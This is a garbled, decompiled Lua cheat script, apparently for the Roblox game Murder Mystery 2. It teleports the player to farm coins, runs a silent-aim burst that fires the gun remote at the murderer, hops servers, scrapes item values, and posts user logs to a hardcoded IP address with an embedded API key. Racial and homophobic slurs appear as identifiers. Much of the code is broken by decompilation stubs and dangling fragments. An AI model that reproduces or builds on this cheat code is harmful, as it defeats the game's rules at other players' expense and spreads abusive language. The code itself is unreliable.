	local ok, result = pcall(function()
		local v_2 = autofarmStopFloatDrive
		local v_3 = arg
		local str2

		if arg then
			str2 = v_3
		else
			str2 = "safe_land"
		end

		v_2(str2)
		local humanoidRootPart = localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart")
		if not humanoidRootPart then
			autofarmLastCoinPos = nil
			return
		end
		local position = autofarmLastCoinPos or humanoidRootPart.Position
		autofarmLastCoinPos = nil
		autofarmClearFlyForces(humanoidRootPart, "safe_land:" .. tostring(arg or "stop"))
		humanoidRootPart.CFrame = CFrame.new(position + Vector3.new(0, 5, 0))
		humanoidRootPart.AssemblyLinearVelocity = Vector3.zero
		humanoidRootPart.AssemblyAngularVelocity = Vector3.zero
		autofarmDbg("INFO", "land", "stop land", autofarmSnap({ reason = tostring(arg or "stop"), anchor = string.format("%.1f,%.1f,%.1f", position.X, position.Y, position.Z) }))
	end)

	if not ok then
		local v_2 = autofarmDbg
		local tbl5 = { err = tostring(result) }
		local v_3 = tostring
		arg = arg or "?"
		tbl5.reason = v_3(arg)
		v_2("WARN", "land", "stop land error", tbl5)
	end

	task.delay(0.35, function()
		autofarmLandBusy = false
	end)
end

autofarmCoinBrief = function(arg)
	if not arg then
		return nil
	end
	local flag = arg:FindFirstChild("CollectedCoin") ~= nil
	local flag2 = arg:FindFirstChild("TouchInterest") ~= nil
	local name = arg.Parent and arg.Parent.Name or "?"
	local name2 = arg.Parent and arg.Parent.Parent and arg.Parent.Parent.Name or "?"

	local ok, result = pcall(function()
		return arg.Position
	end)

	return {
		name = arg.Name,
		class = arg.ClassName,
		parent = name,
		map = name2,
		hasCollectedCoin = flag,
		hasTouchInterest = flag2,
		transparency = arg:IsA("BasePart") and arg.Transparency or nil,
		canTouch = arg:IsA("BasePart") and arg.CanTouch or nil,
		pos = ok and result and string.format("%.1f,%.1f,%.1f", result.X, result.Y, result.Z) or nil,
		parented = arg.Parent ~= nil,
	}
end

autofarmScanCoinContainers = function()
	local tbl5 = {}
	local n = 0
	local n2 = 0
	local n3 = 0

	for _, child in pairs(Workspace:GetChildren()) do
		if child:IsA("Model") and child:FindFirstChild("CoinContainer") then
			for _, child2 in pairs(child.CoinContainer:GetChildren()) do
				if child2.Name == "Coin_Server" then
					n += 1
					local flag = child2:FindFirstChild("CollectedCoin") ~= nil
					local flag2 = child2:FindFirstChild("TouchInterest") ~= nil

					if flag or not flag2 then
						n2 += 1
					elseif flag2 and not flag then
						n3 += 1
					end

					if #tbl5 < 8 then
						tbl5[#tbl5 + 1] = autofarmCoinBrief(child2)
					end
				end
			end
		end
	end

	return {
		totalCoinServer = n,
		eligible = n3,
		huskOrDead = n2,
		samples = tbl5,
		roundend = roundend,
		startround = startround,
		fullbag = fullbag,
		bag = values.bag,
	}
end

do
	local function fn14()
		local v_2 = autofarmCachedCoinContainer
		if v_2 and v_2.Parent then
			return v_2
		end
		autofarmCachedCoinContainer = nil

		for _, child in ipairs(Workspace:GetChildren()) do
			if child:IsA("Model") then
				local coinContainer = child:FindFirstChild("CoinContainer")
				if coinContainer then
					autofarmCachedCoinContainer = coinContainer
					return coinContainer
				end
			end
		end

		return nil
	end

	local function fn15(arg)
		return arg and arg.Name == "Coin_Server" and arg.Parent and not arg:FindFirstChild("CollectedCoin") and arg:FindFirstChild("TouchInterest") ~= nil
	end

	pickFarmCoin = function(arg)
		local humanoidRootPart = localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart")
		if not humanoidRootPart then
			return nil
		end
		local v_2 = fn14()
		if not v_2 then
			return nil
		end
		local position = humanoidRootPart.Position

		if arg == "Randomize" then
			local n = 0
			local v_3 = nil

			for _, child in ipairs(v_2:GetChildren()) do
				if fn15(child) then
					local ok, result = pcall(function()
						return child.Position - position
					end)

					if ok and result and result.Magnitude < 300 then
						n += 1
						v_3 = v_3 or table.create(32)
						v_3[n] = child
					end
				end
			end

			if n == 0 then
				return nil
			end
			local v_4 = v_3[math.random(1, n)]

			if AUTOFARM_TRACE_MAX then
				autofarmDbg("DEBUG", "coin", "picked random", autofarmCoinBrief(v_4))
			end

			return v_4
		end

		local v_3 = nil
		local n = 90000

		for _, child in ipairs(v_2:GetChildren()) do
			if fn15(child) then
				local ok, result = pcall(function()
					return child.Position - position
				end)

				if ok and result then
					local n2 = result.X * result.X + result.Y * result.Y + result.Z * result.Z

					if n2 < n then
						n = n2
						v_3 = child
					end
				end
			end
		end

		if AUTOFARM_TRACE_MAX and v_3 then
			autofarmDbg("DEBUG", "coin", "picked nearby", function()
				return autofarmSnap({ distance = math.sqrt(n), coin = autofarmCoinBrief(v_3) })
			end)
		end

		return v_3
	end

	GetCointp = function()
		local v_2 = fn14()
		if not v_2 then
			return nil
		end

		for _, child in ipairs(v_2:GetChildren()) do
			if fn15(child) then
				if AUTOFARM_TRACE_MAX then
					autofarmDbg("DEBUG", "coin", "picked teleport", function()
						return autofarmCoinBrief(child)
					end)
				end

				return child
			end
		end

		if AUTOFARM_TRACE_MAX then
			autofarmDbg("DEBUG", "coin", "teleport pick empty", function()
				return autofarmScanCoinContainers()
			end)
		end

		return nil
	end
end

autofarmCoinGoal = function(arg, arg2)
	return arg + Vector3.new(0, tonumber(arg2) or 0, 0)
end

autofarmClearFlyForces = function(arg, arg2)
	if not arg then
		return
	end
	local n = 0
	local flag = false

	pcall(function()
		local flyNigger = arg:FindFirstChild("FLY_NIGGER")

		if flyNigger then
			flag = true
			flyNigger:Destroy()
			n += 1
		end

		for _, child in ipairs(arg:GetChildren()) do
			if child:IsA("BodyVelocity") or child:IsA("BodyPosition") or child:IsA("BodyAngularVelocity") or child:IsA("LinearVelocity") or child:IsA("AlignPosition") then
				child:Destroy()
				n += 1
			end
		end

		arg.AssemblyLinearVelocity = Vector3.zero
		arg.AssemblyAngularVelocity = Vector3.zero
	end)

	if AUTOFARM_TRACE_MAX and (n > 0 or arg2) then
		autofarmDbg("WARN", "physics", "clear fly forces", autofarmSnap({
			reason = tostring(arg2 or "?"),
			destroyed = n,
			hadNamedFlyBV = flag,
			activeTween = autofarmActiveTween ~= nil,
		}))
	end
end

CoinCollected.OnClientEvent:Connect(function(arg, bag, arg2, ...)
	local n = tonumber(values.bag) or 0
	local n2 = tonumber(bag) or 0

	if values.runnings and n2 > n then
		autofarmTotalCoins = (autofarmTotalCoins or 0) + n2 - n
	end

	values.bag = bag
	autofarmCoinCollectCount = (autofarmCoinCollectCount or 0) + 1

	if AUTOFARM_TRACE_MAX and values.runnings then
		autofarmDbg("EVENT", "bag", "CoinCollected", autofarmSnap({
			playerName = autofarmEyeArgBrief(arg),
			rightnow = bag,
			maximum = arg2,
			a4 = autofarmEyeArgBrief(select(1, ...)),
		}))
	end

	if bag == arg2 and values.runnings then
		fullbag = true
		autofarmDbg("INFO", "bag", "full bag", autofarmSnap({ rightnow = bag, maximum = arg2 }))
		warn("[AutoFarm] Сумка полная!")
		status1 = "Full coinbag!"

		discordNotify("discordNotifyFullBag", {
			title = "Coin bag full",
			description = "Round coin bag reached maximum capacity.",
			color = 16766720,
			fields = {
				{
					name = "Bag",
					value = "`" .. tostring(bag) .. " / " .. tostring(arg2) .. "`",
					inline = true,
				},
			},
			hideBalances = true,
		})
	end
end)

GetAfterRun = function()
	for _, child in ipairs(workspace:GetChildren()) do
		local coinContainer = child:FindFirstChild("CoinContainer")

		if coinContainer then
			for _, child2 in ipairs(coinContainer:GetChildren()) do
				if child2.Name == "Coin_Server" then
					return true
				end
			end
		end
	end

	return false
end

bagparag = Tabs.autofarm:Paragraph({ Title = "Farm progress", Desc = "wait for load all scripts" })
values.bag = 0
autofarmTotalCoins = 0
st = os.time()

task.spawn(function()
	while true do
		if bagparag and values.runnings then
			local v_2 = st
			local n = os.time() - v_2

			local str2 = string.format([[Time elapsed: %02d:%02d:%02d
Total collected: %s
Coinbag: %s
Farm Status: %s]], math.floor(n / 3600), math.floor(n % 3600 / 60), n % 60, autofarmTotalCoins or 0, values.bag or 0, status1 or "Data missed")

			bagparag:SetDesc(str2)
		elseif not values.runnings then
			bagparag:SetDesc("Autofarm is disabled. Waiting...")
		end

		task.wait(1)
	end
end)

autofarmShootMurderBurst = function(arg, arg2)
	autofarmDbg("INFO", "shoot", "burst begin", autofarmSnap({
		context = arg,
		requireResetMurderer = arg2,
		aimMode = "autofarm_piercing",
		combatAimType = "Piercing",
		maxSec = 60,
	}))

	autofarmBurstShooting = true
	status1 = "Shooting murder..."
	local character = localPlayer.Character
	local humanoid = character and character:FindFirstChildOfClass("Humanoid")

	if character and humanoid and not character:FindFirstChild("Gun") then
		local v_2 = findPlayerTool(localPlayer, "Gun")

		if v_2 then
			humanoid:EquipTool(v_2)
			local now = os.clock()

			while not character:FindFirstChild("Gun") and os.clock() - now < 0.8 do
				task.wait()
			end
		end
	end

	if not (character and character:FindFirstChild("Gun")) then
		autofarmDbg("WARN", "shoot", "no gun — abort burst", autofarmSnap({ context = arg }))
		autofarmBurstShooting = false
		return false
	end

	local n = os.clock() + 60
	local n2 = 0
	local n3 = 0
	local n4 = 0
	local exitTo = nil
	local v_2, humanoid2, v_3, humanoid3

	while true do
		if not (os.clock() < n) then
			exitTo = 1
			break
		else
			if not values.runnings then
				exitTo = 2
				break
			elseif arg2 and not values.resetmurderer then
				exitTo = 3
				break
			else
				v_2 = autofarmCachedRoundData and autofarmCachedRoundData[localPlayer.Name]
				local character2 = localPlayer.Character
				humanoid2 = character2 and character2:FindFirstChildOfClass("Humanoid")

				if v_2 and (v_2.Dead == true or v_2.Killed == true) or humanoid2 and humanoid2.Health <= 0 then
					exitTo = 4
					break
				else
					v_3 = findMurder()
					local character3 = v_3 and v_3.Character
					humanoid3 = character3 and character3:FindFirstChildOfClass("Humanoid")
					local humanoidRootPart = character3 and character3:FindFirstChild("HumanoidRootPart")

					if not (not v_3 or not character3 or not humanoid3 or not humanoidRootPart or humanoid3.Health <= 0) then
						character2 = localPlayer.Character
						local humanoid4 = character2 and character2:FindFirstChildOfClass("Humanoid")

						if not (character2 and character2:FindFirstChild("Gun")) then
							local v_4 = character2 and humanoid4 and findPlayerTool(localPlayer, "Gun")

							if v_4 and humanoid4 then
								humanoid4:EquipTool(v_4)
								local now = os.clock()

								while not character2:FindFirstChild("Gun") and os.clock() - now < 0.8 do
									task.wait()
								end
							end
						end

						local gun = character2 and character2:FindFirstChild("Gun")

						if not gun then
							if os.clock() - n3 >= 1 then
								n3 = os.clock()
								autofarmDbg("WARN", "shoot", "gun lost — retry equip", autofarmSnap({ context = arg, shot = n2 }))
							end

							task.wait(0.2)
						else
							n2 += 1
							local shoot = gun:FindFirstChild("Shoot")
							local flag = false
							local flag2 = false

							if shoot then
								flag, flag2 = pcall(function()
									local v_4 = silentAimBuildState(v_3, character2)
									if not v_4 then
										return false
									end
									local v_5 = silentAimPredictors.Piercing(v_4, silentAimTune)
									local v_6 = silentAimPiercingOrigin(v_4)
									shoot:FireServer(v_6, CFrame.new(silentAimExtend(v_6.Position, v_5)))
									return true
								end)
							end

							if flag and flag2 then
								n4 += 1
							end

							task.wait(0.12)
						end

						continue
					end
				end
			end

			break
		end
	end

	if exitTo ~= 1 then
		if exitTo == 2 then
			autofarmDbg("WARN", "shoot", "burst stop — farm off", autofarmSnap({ context = arg, shot = n2 }))
		elseif exitTo == 3 then
			autofarmDbg("WARN", "shoot", "burst stop — resetmurderer off", autofarmSnap({ context = arg, shot = n2 }))
		else
			if exitTo ~= 4 then
				autofarmDbg("INFO", "shoot", "burst stop — murder dead/missing", autofarmSnap({
					context = arg,
					shot = n2,
					murder = v_3 and v_3.Name,
					health = humanoid3 and humanoid3.Health,
					elapsed = math.floor(60 - n - os.clock()),
				}))

				autofarmBurstShooting = false
				return true
			end

			autofarmDbg("WARN", "shoot", "burst stop — local dead", autofarmSnap({
				context = arg,
				shot = n2,
				pdDead = v_2 and v_2.Dead == true,
				pdKilled = v_2 and v_2.Killed == true,
				health = humanoid2 and humanoid2.Health,
			}))
		end
	end

	autofarmBurstShooting = false
	local flag = findMurder()
	local character2 = flag and flag.Character
	character2 = character2 and character2:FindFirstChildOfClass("Humanoid")
	flag = flag and character2 and character2.Health > 0
	local n5 = 60 - math.max(0, n - os.clock())

	if flag then
		autofarmDbg("WARN", "shoot", "murder still alive after burst", autofarmSnap({ context = arg, shots = n2, fired = n4, murderHealth = character2.Health, elapsed = math.floor(n5) }))
		status1 = "Murder alive (shoot failed)"
	else
		autofarmDbg("INFO", "shoot", "burst done", autofarmSnap({ context = arg, shots = n2, fired = n4, elapsed = math.floor(n5) }))
		status1 = "Murder killed"
	end

	return not flag
end

autofarmIsCombatOrTrollElement = function(arg)
	if not arg or not arg.Tab then
		return false
	end
	local index = arg.Tab.Index
	local flag = Tabs.combat and index == Tabs.combat.Index or Tabs.troll and index == Tabs.troll.Index
	local flag2

	if flag then
		flag2 = flag
	else
		flag2 = Tabs.keybinds and index == Tabs.keybinds.Index
	end

	return flag2
end

autofarmDisableFarmEnemies = function()
	autofarmForceCombatTrollValuesOff()

	if Window and Window.AllElements then
		for _, v_2 in next, Window.AllElements, nil do
			if autofarmIsCombatOrTrollElement(v_2) then
				pcall(function()
					if v_2.Type == "Toggle" and v_2.Set then
						v_2:Set(false)
					elseif type(v_2.Value) == "boolean" and v_2.Set then
						v_2:Set(false)
					end
				end)

				pcall(function()
					if v_2.Lock then
						v_2:Lock()
					end
				end)
			end
		end
	end

	for _, v_2 in ipairs(autofarmEnemyToggleList()) do
		if v_2 then
			pcall(function()
				if v_2.Set then
					v_2:Set(false)
				end
			end)

			pcall(function()
				if v_2.Lock then
					v_2:Lock()
				end
			end)
		end
	end

	pcall(function()
		if Tabs.combat then
			if Tabs.combat.LockAll then
				Tabs.combat:LockAll()
			end

			if Tabs.combat.SetLocked then
				Tabs.combat:SetLocked(true)
			else
				Tabs.combat.Locked = true
			end
		end

		if Tabs.troll then
			if Tabs.troll.LockAll then
				Tabs.troll:LockAll()
			end

			if Tabs.troll.SetLocked then
				Tabs.troll:SetLocked(true)
			else
				Tabs.troll.Locked = true
			end
		end

		if Tabs.keybinds then
			if Tabs.keybinds.LockAll then
				Tabs.keybinds:LockAll()
			end

			if Tabs.keybinds.SetLocked then
				Tabs.keybinds:SetLocked(true)
			else
				Tabs.keybinds.Locked = true
			end
		end
	end)
end

	for _, v_2 in ipairs(autofarmEnemyToggleList()) do

			pcall(function()
				if v_2.Unlock then

			end)

	pcall(function()

			if Tabs.combat.SetLocked then

		end

		if Tabs.troll then

			end

			if Tabs.troll.SetLocked then
				Tabs.troll:SetLocked(false)
			else
				Tabs.troll.Locked = false
			end
		end

		if Tabs.keybinds then
			if Tabs.keybinds.UnlockAll then
				Tabs.keybinds:UnlockAll()
			end

			if Tabs.keybinds.SetLocked then
				Tabs.keybinds:SetLocked(false)
			else
				Tabs.keybinds.Locked = false
			end
		end
	end)
end

Tabs.autofarm:Toggle({
	Title = "loc:autofarm",
	Value = values.runnings,
	Flag = "runnings",
	Callback = function(runnings)
		if (hubConfigLoading or hubConfigMuteAutofarm) and runnings then
			values.runnings = false
			hubPendingAutofarmEnable = true

			autofarmDbg("INFO", "toggle", "farm ON ignored — hub still loading (queued)", autofarmSnap({
				hubConfigLoading = hubConfigLoading,
				hubConfigMuteAutofarm = hubConfigMuteAutofarm,
				pending = true,
			}))

			return
		end

		local flag = not runnings

		if flag then
			hubPendingAutofarmEnable = false
		end

		values.runnings = runnings
		autofarmDbg("INFO", "toggle", runnings and "farm ON" or "farm OFF", autofarmSnap({ webhookValid = isValidDiscordWebhook(discordWebhookGetActiveUrl()) }))

		if hubConfigMuteAutofarm and not runnings then
			if Tabs.troll.SetLocked then
				Tabs.troll:SetLocked(false)
			else
				Tabs.troll.Locked = false
			end

			if Tabs.combat.SetLocked then
				Tabs.combat:SetLocked(false)
			else
				Tabs.combat.Locked = false
			end

			if Tabs.keybinds then
				if Tabs.keybinds.SetLocked then
					Tabs.keybinds:SetLocked(false)
				else
					Tabs.keybinds.Locked = false
				end
			end

			autofarmUnlockFarmEnemies()
			roundend = true
			startround = false
			fullbag = false
			return
		end

		if flag then
			autofarmSafeLandAfterStop("toggle_off")
		end

		if runnings then
			st = os.time()
			roundend = false
			startround = GetAfterRun()
			fullbag = false
			status1 = "Starting..."
			autofarmCachedRoundData = nil

			if Tabs.troll.SetLocked then
				Tabs.troll:SetLocked(true)
			else
				Tabs.troll.Locked = true
			end

			if Tabs.combat.SetLocked then
				Tabs.combat:SetLocked(true)
			else
				Tabs.combat.Locked = true
			end

			if Tabs.keybinds then
				if Tabs.keybinds.SetLocked then
					Tabs.keybinds:SetLocked(true)
				else
					Tabs.keybinds.Locked = true
				end
			end

			autofarmDisableFarmEnemies()

			task.spawn(function()
				autofarmLoopTick = 0
				autofarmDbg("INFO", "loop", "farm loop started", autofarmSnap())

												error("devirt: unstructured jump to block_2270") -- goto block_2270
											end
										else
											autofarmDbg("DEBUG", "coin", "no target this tick", function()
												return autofarmSnap({ scan = autofarmScanCoinContainers() })
											end)

											task.wait(0.5)
											error("devirt: unstructured jump to block_2270") -- goto block_2270
										end
									end
								end

								break
							end
						end

						if exitTo26 == 1 then
							autofarmHadAliveMurderer = true
							error("devirt: unstructured jump to block_13045") -- goto block_13045
						elseif exitTo26 == 2 then
							autofarmHadAliveMurderer = true
							error("devirt: unstructured jump to block_13045") -- goto block_13045
						elseif exitTo26 == 3 then
							autofarmHadAliveMurderer = true
							error("devirt: unstructured jump to block_13045") -- goto block_13045
						elseif exitTo26 == 4 then
							autofarmHadAliveMurderer = true
							error("devirt: unstructured jump to block_13045") -- goto block_13045
						elseif exitTo26 == 5 then
							autofarmHadAliveMurderer = true
							error("devirt: unstructured jump to block_13045") -- goto block_13045
						elseif exitTo26 == 6 then
							autofarmHadAliveMurderer = true
							error("devirt: unstructured jump to block_13045") -- goto block_13045
						elseif exitTo26 == 7 then
							autofarmHadAliveMurderer = true
							error("devirt: unstructured jump to block_13045") -- goto block_13045
						elseif exitTo26 == 8 then
							autofarmHadAliveMurderer = true
							error("devirt: unstructured jump to block_13045") -- goto block_13045
						elseif exitTo26 == 9 then
							autofarmHadAliveMurderer = true
							error("devirt: unstructured jump to block_13045") -- goto block_13045
						elseif exitTo26 == 10 then
							autofarmHadAliveMurderer = true
							error("devirt: unstructured jump to block_13045") -- goto block_13045
						elseif exitTo26 == 11 then
							autofarmHadAliveMurderer = true
							error("devirt: unstructured jump to block_13045") -- goto block_13045
						elseif exitTo26 == 12 then
							autofarmHadAliveMurderer = true
							error("devirt: unstructured jump to block_13045") -- goto block_13045
						elseif exitTo26 == 13 then
							autofarmHadAliveMurderer = true
							error("devirt: unstructured jump to block_13045") -- goto block_13045
						elseif exitTo26 == 14 then
							autofarmHadAliveMurderer = true
							error("devirt: unstructured jump to block_13045") -- goto block_13045
						elseif exitTo26 == 15 then
							autofarmHadAliveMurderer = true
							error("devirt: unstructured jump to block_13045") -- goto block_13045
						end
					elseif exitTo3 == 2 then
						if exitTo2 == 2 then
							error("devirt: unstructured jump to block_13294") -- goto block_13294
						end
					end
				elseif exitTo == 2 then
					error("devirt: unstructured jump to block_13294") -- goto block_13294
				end

				autofarmDbg("INFO", "loop", "farm loop stopped", autofarmSnap())

				if conns.autofarmCoinsWait then
					conns.autofarmCoinsWait:Disconnect()
					conns.autofarmCoinsWait = nil
				end

				if autofarmFloatPart or conns.autofarmFloatSync then
					autofarmStopFloatDrive("loop_exit")
				end
			end)

			task.spawn(function()
				pcall(function()
					sendnotification(lc.trollcombatlock)
					discordNotify("discordNotifyFarmOn", { title = "Autofarm enabled", description = "Coin farming loop started.", color = 5763719 })
				end)
			end)
		else
			if not hubConfigMuteAutofarm then
				sendnotification(lc.trollcombatunlock)
				discordNotify("discordNotifyFarmOff", { title = "Autofarm disabled", description = "Coin farming loop stopped.", color = 9807270 })
			end

			if Tabs.troll.SetLocked then
				Tabs.troll:SetLocked(false)
			else
				Tabs.troll.Locked = false
			end

			if Tabs.combat.SetLocked then
				Tabs.combat:SetLocked(false)
			else
				Tabs.combat.Locked = false
			end

			if Tabs.keybinds then
				if Tabs.keybinds.SetLocked then
					Tabs.keybinds:SetLocked(false)
				else
					Tabs.keybinds.Locked = false
				end
			end

			autofarmUnlockFarmEnemies()
			roundend = true
			startround = false
			fullbag = false
			status1 = "Idle"
			autofarmCachedRoundData = nil
		end
	end,
})

task.spawn(function()
	local now = nil

	while true do
		task.wait(2)

		if values.hopWhenEmpty and values.runnings and not hubRejoinTeleporting and #Players:GetPlayers() <= 1 then
			now = now or os.clock()
			local v_3 = HUB_HOP_ALONE_SECONDS
			local flag = os.clock() - now >= v_3

			if flag then
				local v_4 = hubHopLastAttempt
				flag = os.clock() - v_4 >= HUB_HOP_COOLDOWN
			end

			if flag then
				hubHopLastAttempt = os.clock()
				local v_4, v_5 = hubHopFromEmptyServer()
				now = nil

				if not v_4 then
					warn("[AutoFarm] server hop skipped: " .. tostring(v_5))
					now = nil
					continue
				end

				continue
			end

			continue
		end

		now = nil
	end
end)

sectionLoaded("autofarm")
ItemsDB = {}
isReady = false

task.spawn(function()
	for k, v_3 in pairs({
		other = "https://mm2checker.com/other.html",
		pets = "https://mm2checker.com/pets.html",
		commons = "https://mm2checker.com/commons.html",
		uncommons = "https://mm2checker.com/uncommons.html",
		rares = "https://mm2checker.com/rares.html",
		legendaries = "https://mm2checker.com/legendaries.html",
		ancients = "https://mm2checker.com/ancients.html",
		vintages = "https://mm2checker.com/vintages.html",
		godlies = "https://mm2checker.com/godlies.html",
	}) do
		local v_4 = nil

		if pcall(function()
			v_4 = request({ Url = v_3, Method = "GET" })
		end) and v_4 and v_4.Body then
			for match, match2 in v_4.Body:gmatch("<div class=\"itemhead\">%s*(.-)%s*</div>.-<span class=\"itemvalue\">(.-)</span>") do
				ItemsDB[match] = { value = match2:gsub(",", ""), category = k }
			end

			print("Parsed")
		end

		task.wait(0.4)
	end

	isReady = true
	print("MM2 items DB ready")
end)

findItemEverywhere = function(arg)
	if not isReady then
		return nil, "DB not ready"
	end
	return ItemsDB[arg]
end

		end
		local v_3 = findItemEverywhere(pidoras)

		if v_3 then
			sendnotification(pidoras .. " is " .. v_3.value .. " (" .. v_3.category .. ")")
		else
			sendnotification(lc.itemnotfound)
		end
	end,

task.spawn(function()
	while not isReady do
		task.wait(0.1)
	end

	local str2 = ""

	for _, v_3 in ipairs({
		"other",
		"godlies",
		"ancients",
		"vintages",
		"legendaries",
		"rares",
		"uncommons",
		"commons",
		"pets",
	}) do
		local str3 = str2 .. ("[%s]\n"):format(v_3):upper()

		for k, v_4 in pairs(ItemsDB) do
			if v_4.category == v_3 then
				str3 ..= k .. " = " .. v_4.value .. "\n"
			end
		end

		str2 = str3 .. "\n"
	end

	Tabs.value:Code({ Title = "loc:listvalue", Code = str2 })
end)

snpFlushAllDebugLogs = function()
	pcall(function()
		if type(flushEspLog) == "function" then
			flushEspLog()
		end
	end)

	pcall(function()
		if type(flushSkinLog) == "function" then
			flushSkinLog()
		end
	end)

	pcall(function()
		if type(flushHubBtnLog) == "function" then
			flushHubBtnLog()
		end
	end)

	pcall(function()
		if type(flushConfigLog) == "function" then
			flushConfigLog()
		end
	end)

	pcall(function()
		if type(flushAutofarmLog) == "function" then
			flushAutofarmLog()
		end
	end)

	pcall(function()
		if type(flushSilentAimTelemetry) == "function" then
			flushSilentAimTelemetry()
		end
	end)

	pcall(function()
		if type(userActionPending) == "table" then
			for k, v_3 in pairs(userActionPending) do
				userActionWrite(k, v_3.kind, v_3.value)
			end

			table.clear(userActionPending)
		end

		if type(flushUserActionLog) == "function" then
			flushUserActionLog()
		end
	end)
end

snpFeedbackReadLogFile = function(arg)
	if type(arg) ~= "string" or arg == "" then
		return nil
	end

	if type(readfile) ~= "function" then
		return nil
	end

	if type(isfile) == "function" then
		local ok, result = pcall(isfile, arg)
		if not (ok and result) then
			return nil
		end
	end

	local ok, result = pcall(readfile, arg)
	if not ok or type(result) ~= "string" or result == "" then
		return nil
	end
	local n = SNP_LOG_MAX_BYTES or 7340032
	local str2

	if #result > n then
		str2 = string.sub(result, -n)
	else
		str2 = result
	end

	end

end

		end)

			n = math.floor(result2)
		end
	end)

	end)

	local n4 = nil

	pcall(function()

		end

		end

	local str3 = "PC"

	pcall(function()

		if UserInputService2.TouchEnabled and not UserInputService2.KeyboardEnabled then
			str3 = "Mobile"
		elseif UserInputService2.GamepadEnabled and not UserInputService2.KeyboardEnabled then
			str3 = "Console"
		end
	end)

	return {

		name = localPlayer.Name,

snpUploadFeedbackLogs = function(arg)
	local HttpService2 = game:GetService("HttpService")
	local v_3 = request or http_request
	local request_

	if v_3 then
		request_ = v_3
	else
		request_ = syn and syn.request
	end

	if not request_ then
		return nil, "no_http", nil
	end
	local v_4 = snpCollectFeedbackLogFiles()
	if #v_4 == 0 then
		return nil, "no_logs", nil
	end
	local tbl5 = {}
	tbl5.message = tostring(arg or "")
	tbl5.client = snpCollectFeedbackClientMeta()
	tbl5.files = v_4

	local ok, result = pcall(function()
		return HttpService2:JSONEncode(tbl5)
	end)

	if not ok or type(result) ~= "string" then
		return nil, "encode_failed", nil
	end

	local ok2, result2 = pcall(function()
		return request_({
			Url = "http://132.243.222.170:5000/feedback/logs",
			Method = "POST",
			Headers = { ["Content-Type"] = "application/json", ["x-api-key"] = "SNP_snd_K9vQ2mX7pL4wN8" },
			Body = result,
		})
	end)

	if not ok2 or type(result2) ~= "table" then
		return nil, "request_failed", nil
	end
	local n = tonumber(result2.StatusCode or result2.Status or 0) or 0
	local body = result2.Body or result2.body or ""
	local data = nil

	pcall(function()
		data = HttpService2:JSONDecode(body)
	end)

	if n == 429 then
		local n2 = 150

		if type(data) == "table" then
			n2 = tonumber(data.retryAfterSec) or 150
		end

		return nil, "rate_limited", n2
	end

	if n >= 200 and n < 300 and type(data) == "table" and data.id then
		return tostring(data.id), nil, nil
	end
	return nil, "upload_failed", nil
end

snpFormatFeedbackCooldown = function(arg)
	local n = math.max(1, math.floor(tonumber(arg) or 150))
	local n2 = math.floor(n / 60)
	local n3 = n % 60
	if n2 > 0 and n3 > 0 then
		return string.format(lc.feedback_cooldown_minsec or "%d min %d sec", n2, n3)
	end

	if n2 > 0 then
		return string.format(lc.feedback_cooldown_min or "%d min", n2)
	end
	return string.format(lc.feedback_cooldown_sec or "%d sec", n3)
end

snpNotifyFeedbackCooldown = function(arg)
	local v_3 = snpFormatFeedbackCooldown(arg)
	sendnotification(string.format(lc.feedback_cooldown or "Feedback cooldown: wait %s", v_3), 8)
end

			weldConstraint.Part0 = part0
			weldConstraint.Part1 = part1
			weldConstraint.Parent = part0
		end

		local function createModel(arg)
			local model = Instance.new("Model")
			model.Name = "SNP_AA"
			local part = Instance.new("Part")
			part.Name = "Shaft"
			part.Size = Vector3.new(1.15, 4.2, 1.15)
			part.Color = color72
			part.Material = Enum.Material.SmoothPlastic
			part.CanCollide = true
			part.Anchored = false
			part.TopSurface = Enum.SurfaceType.Smooth
			part.BottomSurface = Enum.SurfaceType.Smooth
			part.CFrame = CFrame.new(arg)
			part.Parent = model
			local part2 = Instance.new("Part")
			part2.Name = "Tip"
			part2.Size = Vector3.new(1.35, 1.25, 1.35)
			part2.Color = color73
			part2.Material = Enum.Material.SmoothPlastic
			part2.CanCollide = true
			part2.Anchored = false
			part2.TopSurface = Enum.SurfaceType.Smooth
			part2.BottomSurface = Enum.SurfaceType.Smooth
			part2.Parent = model
			fn29(part, part2, CFrame.new(0, 2.725, 0))
			local part3 = Instance.new("Part")
			part3.Name = "Base"
			part3.Size = Vector3.new(3.4, 1.15, 1.35)
			part3.Color = color72
			part3.Material = Enum.Material.SmoothPlastic
			part3.CanCollide = true
			part3.Anchored = false
			part3.TopSurface = Enum.SurfaceType.Smooth
			part3.BottomSurface = Enum.SurfaceType.Smooth
			part3.Parent = model
			fn29(part, part3, CFrame.new(0, -2.675, 0))
			model.PrimaryPart = part
			model.Parent = folder
			return model
		end

		local n3 = 0
		local n4 = 0

		while n3 < 900 do
			local v_3 = fn28(15)

			if not v_3 then
				n4 += 1
				if not (n4 >= 8) then
					task.wait(0.22)
					continue
				end
			else
				local n5 = math.min(10, 900 - n3)

				for i = 1, n5 do
					createModel(v_3 + Vector3.new((math.random() - 0.5) * 28, (math.random() - 0.5) * 6, (math.random() - 0.5) * 28))
				end

				n3 += n5
				n4 = 0

				if n3 < 900 then
					task.wait(0.22)
				end

				continue
			end

			break
		end

		task.delay(180, function()
			pcall(function()
				if sound then
					sound:Stop()
					sound:Destroy()
				end
			end)

			pcall(function()
				folder:Destroy()
			end)
		end)
	end

	local function fn28(arg, arg2, arg3, arg4)
		local v_3 = fn20(arg)
		local v_4 = fn20(arg2)
		local v_5 = fn21(arg3)
		if not v_3 or not v_4 or type(v_5) ~= "table" then
			return
		end
		local n2 = tonumber(v_5.frameSizeX) or 0
		local n3 = tonumber(v_5.frameSizeY) or 0
		local n4 = tonumber(v_5.columns) or 0
		local n5 = tonumber(v_5.totalFrames) or 0
		local n6 = tonumber(v_5.frameRate) or 12
		if n2 < 1 or n3 < 1 or n4 < 1 or n5 < 1 then
			return
		end

		pcall(function()
			ContentProvider:PreloadAsync({ v_3, v_4 })
		end)

		local sound = Instance.new("Sound")
		sound.SoundId = v_3
		sound.Volume = 10
		sound.Parent = game:GetService("SoundService")
		fn22(sound, 8)
		local v_6 = createScreenGui()

		if not v_6 then
			pcall(function()
				sound:Destroy()
			end)

			return
		end

		local frame = Instance.new("Frame")
		frame.BackgroundColor3 = Color3.new(0, 0, 0)
		frame.BorderSizePixel = 0
		frame.Size = UDim2.fromScale(1, 1)
		frame.Parent = v_6
		local imageLabel = Instance.new("ImageLabel")
		imageLabel.BackgroundTransparency = 1
